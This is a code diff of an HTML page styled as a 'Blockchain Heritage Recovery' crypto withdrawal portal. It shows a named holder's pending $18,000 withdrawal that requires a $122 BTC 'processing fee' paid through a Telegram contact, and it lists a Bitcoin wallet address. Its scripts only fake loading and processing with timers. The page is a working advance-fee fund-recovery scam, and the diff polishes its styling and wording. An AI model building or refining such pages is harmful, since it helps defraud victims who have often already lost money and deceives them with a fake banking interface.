@@ -3,9 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Blockchain Heritage Recovery - Crypto Recovery Portal</title>
+    <title>Bank Withdrawal - Express Premium Grants</title>
     <style>
-        /* (All your original CSS remains unchanged - kept for brevity) */
         * {
             margin: 0;
             padding: 0;
@@ -19,24 +18,724 @@
             min-height: 100vh;
         }
 
-        /* ... [All other CSS styles are kept exactly the same] ... */
+        /* Loading Screen */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #1a365d 0%, #2d5a8c 100%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            animation: fadeOut 0.8s ease-in-out 2.5s forwards;
+        }
+
+        .loading-screen.hidden {
+            display: none;
+        }
+
+        @keyframes fadeOut {
+            from { opacity: 1; visibility: visible; }
+            to { opacity: 0; visibility: hidden; }
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255, 255, 255, 0.2);
+            border-top: 4px solid white;
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            text-align: center;
+        }
+
+        /* Container */
+        .container {
+            max-width: 650px;
+            margin: 0 auto;
+            animation: slideIn 0.6s ease-out 2.5s both;
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Header */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 32px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid #e0e6ed;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .bank-logo {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, #2d5a8c 0%, #1a365d 100%);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            box-shadow: 0 4px 15px rgba(45, 90, 140, 0.2);
+        }
+
+        .header-text h1 {
+            font-size: 20px;
+            color: #1a365d;
+            margin-bottom: 4px;
+        }
+
+        .header-text p {
+            font-size: 13px;
+            color: #718096;
+        }
+
+        .header-status {
+            background: #e6f2ff;
+            border: 1px solid #bdd7f5;
+            color: #2d5a8c;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        /* Account Card */
+        .account-card {
+            background: white;
+            border-radius: 16px;
+            padding: 24px;
+            margin-bottom: 24px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.05);
+            border: 1px solid #e8ecf1;
+            animation: slideUp 0.6s ease-out 0.2s both;
+        }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .account-info {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 24px;
+            margin-bottom: 24px;
+        }
+
+        .info-item {
+            padding-bottom: 16px;
+            border-bottom: 1px solid #edf2f7;
+        }
+
+        .info-item:nth-child(odd):nth-last-child(n+2),
+        .info-item:nth-child(even):nth-last-child(n+2) {
+            border-bottom: 1px solid #edf2f7;
+        }
+
+        .info-label {
+            font-size: 12px;
+            color: #718096;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 6px;
+        }
+
+        .info-value {
+            font-size: 16px;
+            color: #2d5a8c;
+            font-weight: 700;
+        }
+
+        .balance-display {
+            background: linear-gradient(135deg, #2d5a8c 0%, #1a365d 100%);
+            color: white;
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .balance-label {
+            font-size: 12px;
+            opacity: 0.85;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 8px;
+        }
+
+        .balance-amount {
+            font-size: 36px;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+
+        .balance-status {
+            font-size: 12px;
+            opacity: 0.9;
+        }
+
+        /* Withdrawal Button */
+        .withdrawal-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #2d5a8c 0%, #1a365d 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-bottom: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            animation: slideUp 0.6s ease-out 0.3s both;
+            box-shadow: 0 4px 15px rgba(45, 90, 140, 0.2);
+        }
+
+        .withdrawal-btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(45, 90, 140, 0.3);
+        }
+
+        .withdrawal-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .spinner-small {
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top: 2px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+
+        .spinner-small.show {
+            display: inline-block;
+        }
+
+        /* Processing Info */
+        .processing-info {
+            background: #f0f7ff;
+            border: 1px solid #bdd7f5;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 24px;
+            text-align: center;
+            display: none;
+            animation: slideUp 0.6s ease-out both;
+        }
+
+        .processing-info.show {
+            display: block;
+        }
+
+        .processing-icon {
+            font-size: 32px;
+            margin-bottom: 8px;
+            animation: bounce 1s ease-in-out infinite;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-8px); }
+        }
+
+        .processing-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: #1a365d;
+            margin-bottom: 4px;
+        }
+
+        .processing-text {
+            font-size: 13px;
+            color: #2d5a8c;
+        }
+
+        /* Withdrawal Section */
+        .withdrawal-section {
+            display: none;
+        }
+
+        .withdrawal-section.show {
+            display: block;
+        }
+
+        /* Form Styles */
+        .form-section {
+            background: white;
+            border-radius: 16px;
+            padding: 24px;
+            margin-bottom: 24px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.05);
+            border: 1px solid #e8ecf1;
+            animation: slideUp 0.6s ease-out both;
+        }
+
+        .form-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: #1a365d;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #2d5a8c;
+            margin-bottom: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 2px solid #e0e6ed;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: all 0.3s;
+            background: #f9fafb;
+            color: #2d5a8c;
+            font-weight: 500;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #2d5a8c;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(45, 90, 140, 0.1);
+        }
+
+        .form-input:disabled {
+            background: #f5f7fa;
+            color: #718096;
+            cursor: not-allowed;
+        }
+
+        .form-info {
+            background: #f0f7ff;
+            border-left: 3px solid #2d5a8c;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 12px;
+            color: #2d5a8c;
+            margin-top: 8px;
+            line-height: 1.5;
+        }
+
+        /* Bank Info Box */
+        .bank-info-box {
+            background: linear-gradient(135deg, #f0f7ff 0%, #e6f2ff 100%);
+            border: 2px solid #bdd7f5;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 20px;
+        }
+
+        .bank-info-title {
+            font-size: 13px;
+            font-weight: 700;
+            color: #1a365d;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .bank-info-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            font-size: 13px;
+        }
+
+        .bank-info-row:last-child {
+            margin-bottom: 0;
+            padding-top: 10px;
+            border-top: 1px solid #bdd7f5;
+        }
+
+        .bank-info-label {
+            color: #718096;
+            font-weight: 600;
+        }
+
+        .bank-info-value {
+            color: #1a365d;
+            font-weight: 700;
+            font-family: 'Courier New', monospace;
+        }
+
+        /* Receipt Container */
+        .receipt-container {
+            background: white;
+            border: 2px solid #2d5a8c;
+            border-radius: 16px;
+            padding: 32px 24px;
+            margin-bottom: 24px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            animation: slideUp 0.6s ease-out both;
+        }
+
+        .receipt-header {
+            text-align: center;
+            margin-bottom: 24px;
+            border-bottom: 2px solid #edf2f7;
+            padding-bottom: 20px;
+        }
+
+        .receipt-logo {
+            font-size: 40px;
+            margin-bottom: 12px;
+        }
+
+        .receipt-company {
+            font-size: 18px;
+            font-weight: 700;
+            color: #1a365d;
+            margin-bottom: 4px;
+        }
+
+        .receipt-subtitle {
+            font-size: 12px;
+            color: #718096;
+            margin-top: 8px;
+        }
+
+        .receipt-status {
+            display: inline-block;
+            background: #fff3cd;
+            border: 2px solid #ffc107;
+            color: #856404;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-weight: 600;
+            font-size: 12px;
+            margin-bottom: 16px;
+            margin-top: 12px;
+        }
+
+        .receipt-divider {
+            height: 1px;
+            background: #edf2f7;
+            margin: 16px 0;
+        }
+
+        .receipt-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            font-size: 13px;
+        }
+
+        .receipt-label {
+            color: #718096;
+            font-weight: 600;
+        }
+
+        .receipt-value {
+            color: #1a365d;
+            font-weight: 700;
+        }
+
+        /* Charge Notice */
+        .charge-notice {
+            background: linear-gradient(135deg, #fee 0%, #fdd 100%);
+            border: 2px solid #f87171;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+            color: #991b1b;
+        }
+
+        .charge-notice-title {
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .charge-notice-content {
+            font-size: 13px;
+            line-height: 1.7;
+            margin-bottom: 16px;
+        }
+
+        .charge-notice-content p {
+            margin-bottom: 8px;
+        }
+
+        .charge-notice-content ul {
+            margin-left: 18px;
+            margin-top: 8px;
+        }
+
+        .charge-notice-content li {
+            margin-bottom: 6px;
+            font-size: 12px;
+        }
+
+        .charge-amount {
+            font-size: 28px;
+            font-weight: 700;
+            margin: 16px 0;
+            text-align: center;
+            background: rgba(159, 18, 18, 0.1);
+            padding: 14px;
+            border-radius: 8px;
+            color: #991b1b;
+        }
+
+        .charge-explanation {
+            background: rgba(159, 18, 18, 0.05);
+            border-radius: 8px;
+            padding: 14px;
+            font-size: 12px;
+            line-height: 1.7;
+            margin-top: 14px;
+        }
+
+        /* Info Boxes */
+        .info-box {
+            background: white;
+            border: 2px solid #e0e6ed;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 16px;
+            display: flex;
+            gap: 12px;
+            animation: slideUp 0.6s ease-out both;
+        }
+
+        .info-box-icon {
+            font-size: 24px;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .info-box-content {
+            flex: 1;
+        }
+
+        .info-box-title {
+            font-size: 13px;
+            font-weight: 700;
+            color: #1a365d;
+            margin-bottom: 4px;
+        }
+
+        .info-box-text {
+            font-size: 12px;
+            color: #718096;
+            line-height: 1.5;
+        }
+
+        /* Contact Section */
+        .contact-section {
+            background: linear-gradient(135deg, #f0f7ff 0%, #e6f2ff 100%);
+            border: 2px solid #bdd7f5;
+            border-radius: 16px;
+            padding: 24px;
+            margin-bottom: 24px;
+            animation: slideUp 0.6s ease-out 0.1s both;
+        }
+
+        .contact-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: #1a365d;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .contact-text {
+            font-size: 13px;
+            color: #2d5a8c;
+            margin-bottom: 16px;
+            line-height: 1.6;
+        }
+
+        .contact-link {
+            background: linear-gradient(135deg, #2d5a8c 0%, #1a365d 100%);
+            color: white;
+            padding: 12px 20px;
+            border-radius: 8px;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 600;
+            font-size: 13px;
+            transition: all 0.3s;
+            border: none;
+            cursor: pointer;
+        }
+
+        .contact-link:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 15px rgba(45, 90, 140, 0.3);
+        }
+
+        /* Success Section */
+        .success-section {
+            display: none;
+        }
+
+        .success-section.show {
+            display: block;
+            animation: slideUp 0.6s ease-out both;
+        }
+
+        .success-box {
+            background: linear-gradient(135deg, rgba(34, 197, 94, 0.1) 0%, rgba(20, 184, 82, 0.1) 100%);
+            border: 2px solid #22c55e;
+            border-radius: 16px;
+            padding: 24px;
+            text-align: center;
+        }
+
+        .success-icon {
+            font-size: 56px;
+            margin-bottom: 16px;
+            animation: scaleIn 0.6s ease-out;
+        }
+
+        @keyframes scaleIn {
+            from { opacity: 0; transform: scale(0.5); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .success-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #15803d;
+            margin-bottom: 8px;
+        }
+
+        .success-text {
+            font-size: 13px;
+            color: #16a34a;
+            line-height: 1.6;
+        }
+
+        /* Buttons */
+        .confirm-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #2d5a8c 0%, #1a365d 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            padding: 14px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            box-shadow: 0 4px 15px rgba(45, 90, 140, 0.2);
+        }
+
+        .confirm-btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(45, 90, 140, 0.3);
+        }
+
+        .confirm-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                margin: 0;
+            }
+
+            .account-info {
+                grid-template-columns: 1fr;
+            }
+
+            .balance-amount {
+                font-size: 28px;
+            }
+
+            .receipt-container {
+                padding: 20px;
+            }
+
+            .header {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 16px;
+            }
+        }
     </style>
 </head>
 <body>
     <!-- Loading Screen -->
     <div class="loading-screen" id="loadingScreen">
         <div class="spinner"></div>
-        <div class="loading-text">Loading your account...</div>
+        <div class="loading-text">Loading your Recovery Funding account...(Pls Wait)</div>
     </div>
 
     <div class="container">
         <!-- Header -->
         <div class="header">
             <div class="header-left">
-                <div class="bank-logo">🔗</div>
+                <div class="bank-logo">🏦</div>
                 <div class="header-text">
-                    <h1>Blockchain Heritage Recovery</h1>
-                    <p>Crypto Recovery Portal</p>
+                    <h1>BLOCKCHAIN HERITAGE RECOVERY</h1>
+                    <p>Crypto recovery portal </p>
                 </div>
             </div>
             <div class="header-status">✓ Active Account</div>
@@ -77,24 +776,29 @@
 
         <!-- Withdrawal Section -->
         <div class="withdrawal-section" id="withdrawalSection">
+            <!-- Bank Confirmation -->
             <div class="form-section">
                 <div class="form-title">
-                    <span>🔗</span>
-                    <span>Confirm Your Crypto Information</span>
+                    <span>🏦</span>
+                    <span>Confirm Your Information</span>
                 </div>
 
                 <div class="bank-info-box">
                     <div class="bank-info-title">
                         <span>✓</span>
-                        <span>Your Receiving Wallet</span>
+                        <span>Your Receiving Info</span>
                     </div>
                     <div class="bank-info-row">
-                        <span class="bank-info-label">Destination:</span>
-                        <span class="bank-info-value">Crypto Exchange</span>
+                        <span class="bank-info-label">method:</span>
+                        <span class="bank-info-value">(BTC)</span>
                     </div>
                     <div class="bank-info-row">
-                        <span class="bank-info-label">Wallet Address:</span>
-                        <span class="bank-info-value" style="font-size: 13px;">bc1qhgjfx27l3qgkfhuq4fwrn8d4v94x39fy9kwa8x</span>
+                        <span class="bank-info-label">Crypto Network:</span>
+                        <span class="bank-info-value">BITCOIN</span>
+                    </div>
+                    <div class="bank-info-row">
+                        <span class="bank-info-label">BTC WALLET:</span>
+                        <span class="bank-info-value">bc1qhgjfx27l3qgkfhuq4fwrn8d4v94x39fy9kwa8x</span>
                     </div>
                     <div class="bank-info-row">
                         <span class="bank-info-label">Withdrawal Amount:</span>
@@ -109,11 +813,12 @@
             </div>
         </div>
 
-        <!-- Success Section -->
+        <!-- Success Section with Receipt and Contact -->
         <div class="success-section" id="successSection">
+            <!-- Professional Receipt -->
             <div class="receipt-container">
                 <div class="receipt-header">
-                    <div class="receipt-logo">🔗</div>
+                    <div class="receipt-logo">🏦</div>
                     <div class="receipt-company">BLOCKCHAIN HERITAGE RECOVERY</div>
                     <div class="receipt-subtitle">Withdrawal Receipt</div>
                     <div class="receipt-status">⏳ PENDING</div>
@@ -121,6 +826,7 @@
 
                 <div class="receipt-divider"></div>
 
+                <!-- Transaction Details -->
                 <div class="receipt-row">
                     <span class="receipt-label">Account Holder:</span>
                     <span class="receipt-value">Bilal Janbein</span>
@@ -140,17 +846,14 @@
 
                 <div class="receipt-divider"></div>
 
+                <!-- Withdrawal Amount -->
                 <div class="receipt-row">
                     <span class="receipt-label">Withdrawal Amount:</span>
                     <span class="receipt-value" style="color: #22c55e; font-size: 16px;">$18,000.00 USD</span>
                 </div>
                 <div class="receipt-row">
-                    <span class="receipt-label">Destination:</span>
-                    <span class="receipt-value">Crypto Exchange (BTC)</span>
-                </div>
-                <div class="receipt-row">
-                    <span class="receipt-label">Wallet:</span>
-                    <span class="receipt-value" style="font-size: 13px;">bc1qhgjfx27l3qgkfhuq4fwrn8d4v94x39fy9kwa8x</span>
+                    <span class="receipt-label">Destination wallet:</span>
+                    <span class="receipt-value">BITCOIN</span>
                 </div>
                 <div class="receipt-row">
                     <span class="receipt-label">Status:</span>
@@ -170,11 +873,11 @@
                         
                         <p><strong>This fee covers:</strong></p>
                         <ul>
-                            <li>🔐 Enhanced Security Verification</li>
-                            <li>⛓️ Blockchain Network Fees & Confirmation</li>
-                            <li>🏦 Exchange Settlement</li>
-                            <li>📋 Compliance & Fraud Prevention</li>
-                            <li>⚡ Priority Processing</li>
+                            <li>🔐 Enhanced Security Verification & Account Verification</li>
+                            <li>🏦 Blockchain Processing and ACH Settlement</li>
+                            <li>💳 Domestic Bank Transfer & Clearance</li>
+                            <li>📋 Compliance & Fraud Prevention Checks</li>
+                            <li>⚡ Priority Processing (24-48 hour delivery)</li>
                         </ul>
                     </div>
 
@@ -182,46 +885,57 @@
 
                     <div class="charge-explanation">
                         <strong>📌 How It Works:</strong><br>
-                        ✓ Pay the $122 processing fee to activate your withdrawal<br>
-                        ✓ Funds will be immediately approved and sent to your BTC wallet<br>
-                        ✓ Expected delivery: 24-48 hours<br>
-                        ✓ Receive confirmation with transaction hash
+                        ✓ Pay the $122 BTC processing fee to activate your withdrawal<br>
+                        ✓ Funds will be immediately approved and queued for processing<br>
+                        ✓ Transfer initiated to your Crypto BTC account<br>
+                        ✓ Expected delivery: 24-48 business hours<br>
+                        ✓ Receive confirmation with tracking details
                     </div>
                 </div>
             </div>
 
-            <!-- Contact Support -->
+            <!-- Contact Support Section -->
             <div class="contact-section">
                 <div class="contact-title">
                     <span>📞</span>
                     <span>Complete Your Withdrawal</span>
                 </div>
                 <div class="contact-text">
-                    Your withdrawal request has been received and is pending. To complete the processing, contact our support team immediately. They will assist you with the $122 processing fee and finalize your $18,000 withdrawal to your BTC wallet.
+                    Your withdrawal request has been received and is pending. To complete the processing, contact our support team immediately. They will assist you with the $122 BTC processing fee and finalize your $18,000 BTC withdrawal.
                 </div>
-                <a href="https://t.me/safety_Bitcoin" target="_blank" class="contact-link">
+                <a href="https://t.me/AGGRESSIVE_POWER1" target="_blank" class="contact-link">
                     <span>📱</span>
                     <span>Contact Support on Telegram</span>
                 </a>
             </div>
 
-            <!-- Info Boxes (kept similar) -->
+            <!-- Info Boxes -->
             <div class="info-box">
                 <div class="info-box-icon">📧</div>
                 <div class="info-box-content">
                     <div class="info-box-title">What To Expect</div>
                     <div class="info-box-text">
-                        Our support team will guide you through the payment process and provide real-time updates.
+                        Our support team will guide you through the payment process and provide real-time updates on your withdrawal status.
                     </div>
                 </div>
             </div>
 
             <div class="info-box">
-                <div class="info-box-icon">🔒</div>
+                <div class="info-box-icon">✓</div>
                 <div class="info-box-content">
                     <div class="info-box-title">Secure Transaction</div>
                     <div class="info-box-text">
-                        All transactions are encrypted and protected on the blockchain.
+                        All transactions are encrypted and protected. Your recovery funds and account information is safe and secure.
+                    </div>
+                </div>
+            </div>
+
+            <div class="info-box">
+                <div class="info-box-icon">🔔</div>
+                <div class="info-box-content">
+                    <div class="info-box-title">Transaction Updates</div>
+                    <div class="info-box-text">
+                        You will receive SMS and email notifications when your withdrawal is processed and when funds arrive in your account.
                     </div>
                 </div>
             </div>
@@ -229,18 +943,22 @@
     </div>
 
     <script>
+        // Update receipt date
         function updateReceiptDate() {
             const options = { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' };
             const date = new Date().toLocaleDateString('en-US', options);
             document.getElementById('receiptDate').textContent = date;
         }
 
+        // Hide loading screen
         window.addEventListener('load', () => {
             setTimeout(() => {
-                document.getElementById('loadingScreen').classList.add('hidden');
+                const loadingScreen = document.getElementById('loadingScreen');
+                loadingScreen.classList.add('hidden');
             }, 2500);
         });
 
+        // Initiate withdrawal
         function initiateWithdrawal() {
             const btn = document.getElementById('withdrawalBtn');
             const spinner = document.getElementById('withdrawalSpinner');
@@ -250,6 +968,7 @@
             btn.disabled = true;
             spinner.classList.add('show');
             text.textContent = 'Processing...';
+
             processingInfo.classList.add('show');
 
             setTimeout(() => {
@@ -259,10 +978,11 @@
                 processingInfo.classList.remove('show');
 
                 document.getElementById('withdrawalSection').classList.add('show');
-                document.getElementById('withdrawalSection').scrollIntoView({ behavior: 'smooth' });
+                document.getElementById('withdrawalSection').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
             }, 3000);
         }
 
+        // Confirm bank info
         function confirmBankInfo() {
             const btn = document.getElementById('confirmBankBtn');
             const spinner = document.getElementById('confirmBankSpinner');
@@ -280,7 +1000,7 @@
                 document.getElementById('withdrawalSection').classList.remove('show');
                 document.getElementById('successSection').classList.add('show');
                 updateReceiptDate();
-                document.getElementById('successSection').scrollIntoView({ behavior: 'smooth' });
+                document.getElementById('successSection').scrollIntoView({ behavior: 'smooth', block: 'start' });
             }, 3000);
         }
     </script>
